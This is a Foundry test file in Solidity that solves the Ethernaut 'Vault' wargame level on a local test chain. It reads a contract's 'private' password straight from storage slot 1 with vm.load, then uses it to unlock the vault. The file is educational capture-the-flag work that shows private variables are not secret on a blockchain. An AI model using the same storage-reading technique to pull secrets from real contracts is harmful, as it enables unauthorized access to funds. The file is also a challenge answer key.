// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Vault/VaultFactory.sol";
import "../src/Ethernaut.sol";

// forge test --match-contract VaultTest -vvvv
contract VaultTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        // create new instance of ethernaut
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our address 5 ether
    }

    function testVaultHack() public {
        /****************
         * Factory setup *
         *************** */
        VaultFactory vaultFactory = new VaultFactory();
        ethernaut.registerLevel(vaultFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
        Vault ethernautVault = Vault(payable(levelAddress)); // 1000 is initial supply
        /****************
         *    Attack     *
         *************** */
        /*
         * Goal: Unlock the vault to pass the level!
         * In this level we discord how to access the storage in Solidity
         * Even though the variable password is set as private, nothing is really private on the blockchain
         * In the contract, there is first here is the definition of the variables;
         *  bool public locked; --> 0
         *  bytes32 private password; --> 1
         */
        bytes32 password = vm.load(levelAddress, bytes32(uint256(1))); // We need to access slot 1
        ethernautVault.unlock(password);
        assertEq(ethernautVault.locked(), false);

        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
